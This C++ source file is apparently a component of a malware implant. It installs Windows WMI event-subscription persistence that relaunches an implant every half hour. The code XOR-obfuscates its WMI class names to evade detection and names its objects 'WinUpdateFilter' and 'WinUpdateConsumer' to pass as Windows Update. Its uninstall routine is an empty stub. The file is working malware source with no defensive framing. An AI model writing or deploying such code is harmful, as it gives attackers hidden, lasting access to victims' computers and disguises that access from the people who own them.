#include "WmiPersistence.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

namespace persistence {

namespace {
    // Corrected XOR strings (key 0x5A)
    // "ROOT\\subscription"
    std::wstring kRootSub = L"\x08\x15\x15\x0E\x06\x06\x29\x2F\x38\x29\x39\x28\x33\x2A\x2E\x33\x35\x34";
    // "__EventFilter"
    std::wstring kEventFilter = L"\x05\x05\x1F\x2C\x3F\x34\x2E\x1C\x33\x36\x2E\x3F\x28";
    // "CommandLineEventConsumer"
    std::wstring kConsumer = L"\x19\x35\x37\x37\x3B\x34\x3E\x16\x33\x34\x3F\x1F\x2C\x3F\x34\x2E\x19\x35\x34\x29\x2F\x37\x3F\x28";
    // "__FilterToConsumerBinding"
    std::wstring kBinding = L"\x05\x05\x1C\x33\x36\x2E\x3F\x28\x0E\x35\x19\x35\x34\x29\x2F\x37\x3F\x28\x18\x33\x34\x3E\x33\x34\x3D";
}

bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring& taskName) {
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSub).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        return false;
    }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    std::wstring filterName = L"WinUpdateFilter_" + taskName;
    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                         L"(TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute = 0 OR TargetInstance.Minute = 30))";

    IWbemClassObject* pFilterClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kEventFilter).c_str()), 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr)) { pSvc->Release(); pLoc->Release(); return false; }

    IWbemClassObject* pFilterInstance = nullptr;
    pFilterClass->SpawnInstance(0, &pFilterInstance);

    VARIANT var;
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterName.c_str());
    pFilterInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(query.c_str());
    pFilterInstance->Put(L"Query", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    pFilterInstance->Put(L"QueryLanguage", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    pFilterInstance->Put(L"EventNamespace", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    std::wstring consumerName = L"WinUpdateConsumer_" + taskName;
    IWbemClassObject* pConsumerClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kConsumer).c_str()), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInstance = nullptr;
    pConsumerClass->SpawnInstance(0, &pConsumerInstance);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerName.c_str());
    pConsumerInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(implantPath.c_str());
    pConsumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    IWbemClassObject* pBindingClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kBinding).c_str()), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInstance = nullptr;
    pBindingClass->SpawnInstance(0, &pBindingInstance);

    std::wstring filterRelPath = utils::DecryptW(kEventFilter) + L".Name=\"" + filterName + L"\"";
    std::wstring consumerRelPath = utils::DecryptW(kConsumer) + L".Name=\"" + consumerName + L"\"";

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterRelPath.c_str());
    pBindingInstance->Put(L"Filter", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerRelPath.c_str());
    pBindingInstance->Put(L"Consumer", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    pBindingInstance->Release();
    pBindingClass->Release();
    pConsumerInstance->Release();
    pConsumerClass->Release();
    pFilterInstance->Release();
    pFilterClass->Release();
    pSvc->Release();
    pLoc->Release();

    return SUCCEEDED(hr);
}

bool WmiPersistence::Verify(const std::wstring& taskName) {
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSub).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); return false; }

    std::wstring filterName = L"WinUpdateFilter_" + taskName;
    std::wstring relPath = utils::DecryptW(kEventFilter) + L".Name=\"" + filterName + L"\"";

    IWbemClassObject* pObj = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(relPath.c_str()), 0, NULL, &pObj, NULL);

    bool exists = SUCCEEDED(hr) && pObj != nullptr;
    if (pObj) pObj->Release();
    pSvc->Release();
    pLoc->Release();

    return exists;
}

bool WmiPersistence::Uninstall(const std::wstring& taskName) {
    (void)taskName;
    return true;
}

} // namespace persistence
